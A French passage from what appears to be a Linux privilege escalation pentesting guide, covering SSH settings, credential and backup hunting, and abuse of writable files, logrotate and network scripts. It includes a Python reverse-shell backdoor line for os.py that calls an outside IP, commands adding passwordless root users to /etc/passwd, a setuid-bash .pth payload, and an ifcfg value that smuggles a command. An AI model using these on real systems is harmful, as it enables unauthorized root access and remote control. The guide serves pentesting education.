Une clé privée d’autorité de certification peut également être utilisable **sans être lisible** par l’utilisateur actuel si une règle de délégation de privilèges permet à cet utilisateur d’exécuter un [signataire de certificats tel que `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) sans restriction sous l’identité du propriétaire de la clé. Faites le lien entre la commande et les arguments exacts autorisés, l’accès du compte signataire à la clé, l’autorité de certification publique approuvée par la configuration effective de sshd, le principal accepté pour le compte cible, la validité du certificat et la politique de connexion de ce compte. Une commande de signature déléguée ou un fichier d’autorité de certification de confiance ne prouve pas, à lui seul, qu’un accès à un autre compte est possible ; ne signez pas de certificat de test pendant une énumération passive.

Pour la voie distincte de confiance des autorités de certification par compte, consultez [Confusion du délimiteur de principal dans les certificats SSH](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion).

### AuthorizedKeysFile

Indique les fichiers contenant les clés publiques pouvant être utilisées pour l’authentification des utilisateurs. Il peut contenir des jetons comme `%h`, qui seront remplacés par le répertoire personnel. **Vous pouvez indiquer des chemins absolus** (commençant par `/`) ou **des chemins relatifs au répertoire personnel de l’utilisateur**. Par exemple :

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Cette configuration indiquera que si vous essayez de vous connecter avec la clé **privée** de l’utilisateur "**testusername**", ssh comparera la clé publique de votre clé à celles situées dans `/home/testusername/.ssh/authorized_keys` et `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

L’agent forwarding SSH vous permet **d’utiliser vos clés SSH locales au lieu de laisser des clés** (sans phrase de passe !) sur votre serveur. Vous pourrez ainsi **rebondir** via ssh **vers un hôte**, puis **vers un autre** hôte **en utilisant** la **clé** située sur votre **hôte initial**.

Vous devez définir cette option dans `$HOME/.ssh.config` comme ceci :

```
Host example.com
  ForwardAgent yes
```

Notez que si `Host` est `*`, chaque fois que l’utilisateur se connecte à une autre machine, cet hôte pourra accéder aux clés (ce qui constitue un problème de sécurité).

Le fichier `/etc/ssh_config` peut **remplacer** ces **options** et autoriser ou interdire cette configuration.\
Le fichier `/etc/sshd_config` peut **autoriser** ou **interdire** le transfert de ssh-agent à l’aide du mot-clé `AllowAgentForwarding` (autorisé par défaut).

Si vous constatez que Forward Agent est configuré dans un environnement, consultez la page suivante, car **vous pourriez pouvoir en abuser pour élever vos privilèges** :


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Fichiers intéressants

### Fichiers de profil

Le fichier `/etc/profile` et les fichiers du répertoire `/etc/profile.d/` sont des **scripts exécutés lorsqu’un utilisateur ouvre un nouveau shell**. Par conséquent, si vous pouvez **écrire dans l’un d’eux ou le modifier, vous pouvez élever vos privilèges**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Si un script de profil étrange est trouvé, vous devriez vérifier s’il contient des **informations sensibles**.

### Fichiers passwd/shadow

Selon le système d’exploitation, les fichiers `/etc/passwd` et `/etc/shadow` peuvent porter un autre nom ou avoir une sauvegarde. Il est donc recommandé de **tous les trouver** et de **vérifier si vous pouvez les lire** afin de voir **s’ils contiennent des hashes** :

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Dans certains cas, vous pouvez trouver des **hachages de mots de passe** dans le fichier `/etc/passwd` (ou un fichier équivalent).

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd modifiable

Tout d’abord, générez un mot de passe avec l’une des commandes suivantes.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Ajoutez ensuite l’utilisateur `hacker` et définissez le mot de passe généré.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Par exemple : `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Vous pouvez maintenant utiliser la commande `su` avec `hacker:hacker`

Vous pouvez aussi utiliser les lignes suivantes pour ajouter un utilisateur fictif sans mot de passe.\
AVERTISSEMENT : cela pourrait dégrader la sécurité actuelle de la machine.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

REMARQUE : sur les plateformes BSD, `/etc/passwd` se trouve dans `/etc/pwd.db` et `/etc/master.passwd`. De plus, `/etc/shadow` est renommé en `/etc/spwd.db`.

Vous devriez vérifier si vous pouvez **écrire dans certains fichiers sensibles**. Par exemple, pouvez-vous écrire dans un **fichier de configuration de service** ?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat dans /etc/systemd/,** vous pouvez modifier les lignes :

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Votre backdoor sera exécutée au prochain démarrage de tomcat.

### Vérifier les dossiers

Les dossiers suivants peuvent contenir des sauvegardes ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Vous ne pourrez probablement pas lire le dernier, mais essayez)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Emplacement inhabituel/Fichiers appartenant à l’utilisateur

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Fichiers modifiés au cours des dernières minutes

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Fichiers de base de données Sqlite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Pour les bases de données applicatives lisibles, examinez les noms des tables et des colonnes à la recherche de noms d’utilisateur et de hashes de mots de passe. Trouver un hash, récupérer le mot de passe correspondant et prouver qu’il est réutilisé pour un compte local sont des étapes distinctes ; une chaîne hexadécimale générique de 32 caractères ne suffit pas à conclure qu’il s’agit de MD5 ni qu’elle donne accès à un compte.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Si l’historique shell lisible contient une commande `sudo` suivie d’une courte ligne ressemblant à un mot de passe, inspectez manuellement les lignes qui l’entourent. Un mot de passe saisi à l’invite normale de `sudo` n’est pas enregistré dans l’historique shell ; une ligne suivante peut être une saisie accidentelle dans le shell, mais ne prouve pas qu’il s’agit d’un mot de passe valide. Le marqueur `.sudo_as_admin_successful` indique une utilisation antérieure, pas une autorisation actuelle.

### Fichiers cachés

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Scripts/binaires dans le PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Fichiers Web**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Sauvegardes**

Inspectez les fichiers lisibles dans les répertoires de sauvegarde, ainsi que les fichiers dont le **nom** contient `backup` : une archive au nom opaque ou dotée d’une extension de chiffrement peut tout de même exposer d’anciennes données d’application. Une archive chiffrée est seulement une piste d’exposition. La récupération du mot de passe, l’inspection de son contenu, la récupération d’un hash d’application et la réutilisation de ce mot de passe pour un compte Unix sont des étapes distinctes à vérifier ; la présence d’un hash dans une archive ne prouve pas qu’il permet une connexion locale.

Les sauvegardes lisibles de machines virtuelles méritent le même examen. Une configuration VirtualBox `.vbox` peut identifier les images `.vdi` attachées et contenir des métadonnées de clé de disque chiffrée ; [VirtualBox indique que la clé de données chiffrée est stockée dans la configuration de la VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). La configuration et l’image doivent toutes deux être accessibles pour qu’un examen hors ligne du disque soit possible. Un volume invité peut avoir sa propre [couche de chiffrement LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), qui nécessite une clé distincte. Même après un déchiffrement autorisé, d’anciens scripts ou fichiers de configuration peuvent contenir un mot de passe ; vérifiez que l’identifiant est toujours valide pour un compte hôte et que sa stratégie `sudo` effective autorise une commande privilégiée avant de parler d’escalade locale. Lors de l’énumération passive, répertoriez les chemins et les permissions sans copier, déchiffrer ni monter les images.

Lors de l’inspection d’une archive lisible, listez les noms des fichiers qu’elle contient avant d’en extraire quoi que ce soit : des fichiers d’authentification cachés, des codes de récupération ou des clés SSH peuvent être présents, même si les copies actives sont protégées. Les noms de fichiers ne sont qu’une piste ; vérifiez séparément le contenu et toute réutilisation de compte.

Donnez la priorité aux **archives lisibles appartenant à un autre utilisateur** dans les répertoires de sauvegarde, en particulier celles appartenant à root et celles accessibles via l’appartenance à un groupe. Une ancienne archive peut contenir un fichier de configuration ou un secret d’authentification, même si la copie active est protégée. Pour une interface locale de sauvegarde comme [Backrest](https://garethgeorge.github.io/backrest/), vérifiez le compte effectif du service et si un utilisateur disposant de privilèges inférieurs peut lire sa configuration ou s’authentifier auprès de l’interface. Ses [hooks](https://garethgeorge.github.io/backrest/docs/hooks) et son [interface de commande restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) peuvent s’exécuter avec les privilèges du daemon en matière de fichiers et de commandes ; un listener loopback ne suffit pas à déterminer l’impact. Le `passwordBcrypt` de Backrest est un hash bcrypt encodé en base64 dans son [code d’authentification](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), et non un mot de passe en texte clair. Vérifiez l’identité du service, la validité des identifiants et l’accès au plan ou au dépôt concerné avant de considérer une archive ou une interface exposée comme une frontière de privilèges.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Fichiers connus contenant des mots de passe

Lisez le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) : il recherche **plusieurs fichiers susceptibles de contenir des mots de passe**.\
**Un autre outil intéressant** que vous pouvez utiliser à cette fin est [**LaZagne**](https://github.com/AlessandroZ/LaZagne), une application open source qui permet de récupérer de nombreux mots de passe stockés sur un ordinateur local sous Windows, Linux et Mac.

Si `/etc/guacamole/guacamole.properties` est lisible, examinez ses paramètres de connexion à la base de données `mysql-*`, `postgresql-*` ou `sqlserver-*`. Si le compte est autorisé à lire les tables JDBC de Guacamole, `guacamole_connection_parameter` peut contenir des valeurs enregistrées pour les paramètres SSH `username`, `password`, `private-key` ou `passphrase`. Commencez par les ID de connexion et les noms des paramètres, puis examinez uniquement les lignes pertinentes ; une valeur enregistrée peut être un jeton dynamique ou une référence à un coffre plutôt qu’un secret réutilisable. Consultez le [schéma JDBC de Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) et les [paramètres de connexion SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

Le [gestionnaire de mots de passe pswm](https://github.com/Julynx/pswm#usage) stocke par défaut un coffre chiffré dans `~/.local/share/pswm/pswm`. Si le coffre d’un autre utilisateur est visible, vérifiez son propriétaire et si votre compte peut réellement le lire. Le chemin du coffre ne révèle pas à lui seul les identifiants ; récupérer son mot de passe maître, trouver un mot de passe de compte réutilisable et confirmer les privilèges de ce compte sont des étapes distinctes.

La [base de données par défaut de Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) se trouve dans `~/.passpie/` et contient un trousseau `.keys` ainsi que des fichiers d’identifiants chiffrés `.pass` dans des répertoires de groupes. La présence d’un répertoire de base de données ne constitue qu’une piste de chemin : vérifiez l’accès à la clé et à l’entrée chiffrée pertinente, la présence éventuelle d’une phrase secrète principale requise, ainsi que l’appartenance de l’identifiant récupéré à un compte plus privilégié. Passpie prend également en charge les [chemins de base de données personnalisés](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases) ; le chemin par défaut n’est donc pas exhaustif. L’énumération automatisée doit lister les métadonnées sans exporter les identifiants ni afficher le contenu des clés.

### Journaux

Si vous pouvez lire les journaux, vous pourrez peut-être y trouver des **informations intéressantes/confidentielles**. Plus le journal est étrange, plus il sera intéressant (probablement).\
De plus, certains **journaux d’audit** mal configurés (ou piégés ?) peuvent permettre d’**enregistrer des mots de passe** dans les journaux d’audit, comme expliqué dans cet article : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Pour **consulter les journaux, le groupe** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) sera très utile.

### Fichiers shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Recherche générique d’identifiants / expressions régulières

Vous devriez également rechercher les fichiers contenant le mot « **password** » dans leur **nom** ou dans leur **contenu**, ainsi que les adresses IP et les e-mails dans les logs, ou les expressions régulières de hash.\
Je ne vais pas détailler ici comment faire tout cela, mais si cela vous intéresse, vous pouvez consulter les dernières vérifications effectuées par [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Fichiers modifiables

### Python library hijacking

Si vous savez **depuis quel emplacement** un script Python sera exécuté et que vous **pouvez écrire dans** ce dossier ou modifier les bibliothèques Python, vous pouvez modifier la bibliothèque OS et y ajouter une backdoor (si vous pouvez écrire dans le dossier depuis lequel le script Python sera exécuté, copiez-collez la bibliothèque os.py).

Pour **ajouter une backdoor à la bibliothèque**, ajoutez simplement la ligne suivante à la fin de la bibliothèque os.py (modifiez l’IP et le PORT) :

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### Fichier `.pth` accessible en écriture traité par `site.addsitedir()`

Ne considérez pas `site.addsitedir(DIR)` comme équivalent à `sys.path.append(DIR)`. Cette fonction traite également tous les fichiers `*.pth` dans `DIR`. Une ligne commençant par `import` suivi d’une espace ou d’une tabulation est exécutée comme du code Python. Les lignes contenant des chemins sont plutôt résolues par rapport au répertoire du site et ajoutées uniquement si les chemins existent.<sup>[[38]](#references)</sup>

Cela peut entraîner une privilege escalation lorsqu’un programme Python autorisé par sudo ou exécuté avec d’autres privilèges appelle `site.addsitedir()` sur un répertoire accessible en écriture par l’utilisateur actuel ou par l’un de ses groupes. Le code `.pth` est exécuté pendant que le programme privilégié configure son chemin d’importation, avant que son action normale ne soit lancée.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Le contenu exécutable d’un fichier `.pth` doit tenir sur une seule ligne, mais les points-virgules permettent d’enchaîner plusieurs instructions. Par exemple, un chemin d’exécution en tant que root peut créer une copie de Bash avec le bit setuid ; invoquez Bash avec `-p` pour qu’il conserve son ID effectif.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

L’option `-S` désactive uniquement l’initialisation automatique de `site` par Python. Elle ne protège pas un programme qui importe explicitement `site` et appelle `site.addsitedir()`. Supprimez les répertoires accessibles en écriture par un attaquant des chemins d’importation privilégiés, et exigez que le répertoire et ses fichiers `.pth` appartiennent exclusivement à l’administrateur privilégié et ne soient accessibles en écriture que par lui.<sup>[[38]](#references)[[39]](#references)</sup>

### Exploitation de logrotate

Une tâche `logrotate` privilégiée peut créer une possibilité d’écriture de fichier entre utilisateurs lorsqu’elle fait effectivement la rotation d’un journal situé sous un répertoire qu’un utilisateur moins privilégié peut remplacer ou rediriger pendant la rotation. Un journal accessible en écriture constitue seulement une piste. Vérifiez la règle active exacte et ses directives `create`, `olddir` et `su` ; l’identité effective de l’ordonnanceur ; les droits d’écriture et de recherche sur le répertoire parent du journal ; et si la version installée et la politique autorisent le changement de destination. Un shell privilégié lancé ultérieurement doit également charger le fichier obtenu pour qu’une écriture dans un fichier de démarrage entraîne l’exécution de commandes. Examinez la planification, la règle, la version et le packaging, ainsi que les métadonnées du chemin, sans déclencher de rotation ni tenter de provoquer la condition de concurrence.

> [!TIP]
> Ne considérez pas `3.18.0` ni une chaîne de version quelconque comme seuil déterminant à elle seule l’exploitabilité. Le [journal des modifications de l’amont](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) répertorie des renforcements concernant les répertoires et les liens symboliques dans plusieurs versions, et les distributions peuvent rétroporter des correctifs. Le [manuel de l’amont](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) recommande `su` lorsque `root` effectue la rotation de journaux dans des répertoires contrôlés par des utilisateurs non privilégiés ; vérifiez la règle effective et le comportement réel.

Vous trouverez des informations plus détaillées sur cette vulnérabilité sur cette page : [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Vous pouvez exploiter cette vulnérabilité avec [**logrotten**](https://github.com/whotwagner/logrotten).

Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(journaux nginx)**. Par conséquent, lorsque vous découvrez qu’il est possible de modifier les journaux, vérifiez qui les gère et si vous pouvez élever vos privilèges en remplaçant les journaux par des liens symboliques.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Référence de la vulnérabilité :** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Un fichier `ifcfg-*` constitue une piste à examiner lorsqu’un utilisateur moins privilégié peut le créer ou le modifier **et** qu’un mécanisme d’activation réseau privilégié lira précisément ce fichier. Vérifiez les permissions effectives du fichier et du répertoire, l’interface sélectionnée, l’implémentation installée de `ifup`/`ifdown` et l’identité de la personne ou du processus qui l’invoque. Un fichier accessible en écriture ne provoque pas à lui seul l’exécution. Le [guide réseau de Red Hat pour RHEL 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) distingue les anciens scripts réseau de NetworkManager : ce dernier ne déclenche pas à lui seul les premiers. La [documentation de RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) précise que ses commandes `ifup`/`ifdown` utilisent NetworkManager par défaut, tandis que le paquet facultatif pour les anciens scripts fournit des scripts shell.

Sur un système qui utilise effectivement des anciens scripts privilégiés, une affectation `ifcfg-*` non protégée par des guillemets et interprétée par le shell, telle que `NAME=`, peut franchir une frontière d’exécution de code. Vérifiez l’analyseur exact, la valeur et le chemin d’activation ; ne déduisez pas une interprétation par le shell du nom du fichier ou de la présence de NetworkManager. Un wrapper autorisé par sudo qui écrit les données fournies par l’appelant dans un fichier `ifcfg-*`, puis appelle l’ancien `ifup`, constitue une autre voie vers cette frontière, même si l’appelant ne peut pas modifier directement le fichier.

Par exemple : _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Notez l’espace entre Network et /bin/id_)

### **init, init.d, systemd et rc.d**

Le répertoire `/etc/init.d` contient les **scripts** de System V init (SysVinit), le **système classique de gestion des services Linux**. Il comprend des scripts pour `start`, `stop`, `restart` et parfois `reload` les services. Ceux-ci peuvent être exécutés directement ou via les liens symboliques présents dans `/etc/rc?.d/`. Sur les systèmes Redhat, un autre chemin est `/etc/rc.d/init.d`.

En revanche, `/etc/init` est associé à **Upstart**, un système plus récent de **gestion des services**, introduit par Ubuntu, qui utilise des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont toujours utilisés en parallèle des configurations Upstart grâce à une couche de compatibilité intégrée à Upstart.

**systemd** est un gestionnaire moderne d’initialisation et de services qui offre des fonctionnalités avancées, telles que le démarrage des daemons à la demande, la gestion de l’automontage et les instantanés de l’état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets de distribution et dans `/etc/systemd/system/` pour les modifications des administrateurs, simplifiant ainsi l’administration du système.<sup>[[21]](#references)</sup>

## Autres astuces

### **NFS Privilege escalation**


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### **Échapper aux shells restreints**


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### **Cisco - vmanage**


{{#ref}}
../../../network-services-pentesting/cisco-sd-wan-manager-local-privilege-escalation.md
{{#endref}}

## Frameworks de rooting Android : abus du canal du gestionnaire

Les frameworks de rooting Android interceptent couramment un syscall afin d’exposer des fonctionnalités privilégiées du kernel à un gestionnaire en espace utilisateur. Une authentification faible du gestionnaire (par exemple, des vérifications de signature reposant sur l’ordre des FD ou des mots de passe peu sûrs) peut permettre à une application locale d’usurper l’identité du gestionnaire et d’obtenir les privilèges root sur des appareils déjà rootés. Pour en savoir plus et découvrir les détails de l’exploitation, consultez :


{{#ref}}
../../../mobile-pentesting/android-app-pentesting/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Découverte de services VMware Tools et LPE (CWE-426) via exec basé sur des regex (CVE-2025-41244)

La découverte de services basée sur des regex dans VMware Tools/Aria Operations peut extraire un chemin de binaire depuis les lignes de commande des processus et l’exécuter avec -v dans un contexte privilégié. Des motifs permissifs (par exemple, utilisant \S) peuvent correspondre à des listeners placés par un attaquant dans des emplacements accessibles en écriture (par exemple, /tmp/httpd), ce qui entraîne une exécution en tant que root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Pour en savoir plus et découvrir un modèle généralisé applicable à d’autres piles de découverte et de monitoring, consultez :

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protections de sécurité du kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Aide supplémentaire

[Binaires statiques impacket](https://github.com/ropnop/impacket_static_binaries)

## Outils de Privesc Linux/Unix

### **Meilleur outil pour rechercher des vecteurs d’élévation de privilèges locale sous Linux :** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum** : [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(option -t)\
**Enumy** : [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check :** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker :** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot :** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop :** Énumération des vulnérabilités du kernel sous Linux et MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit :** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester :** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (accès physique) :** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Compilation d’autres scripts** : [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (élévation de privilèges via l’interface Crontab, réutilisation des identifiants zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era : payload .text_sig forgé pour le monitor exécuté par cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025 : contournement de Neighborhood Watch (détournement de sudo env_keep PATH)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Élévation de privilèges Linux de base](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guide d’élévation de privilèges Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attaque et défense : techniques d’élévation de privilèges Linux de 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Personne ne s’attend à l’exécution de commandes !](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (élévation de privilèges Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Guide de résolution des exercices du lab - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation : conseils et astuces pour l’élévation de privilèges Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i : outil d’énumération et d’élévation de privilèges Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Qu’est-ce qu’un socket ?](https://www.linux.com/news/what-socket/)
- [15] [Compte rendu de Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Découvrir D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Élévation de privilèges Linux via des exécutables SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo, partie 2 – élévation de privilèges Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Comment gérer les ACL sous Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root sur Redhat/CentOS via network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Qu’est-ce que systemd ?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (injection arithmétique bash via les logs, chaîne complète)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Manuel GNU Bash – BASH_ENV (fichier de démarrage non interactif)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + élévation de privilèges via un lien symbolique TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (copie cron pg_basebackup → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
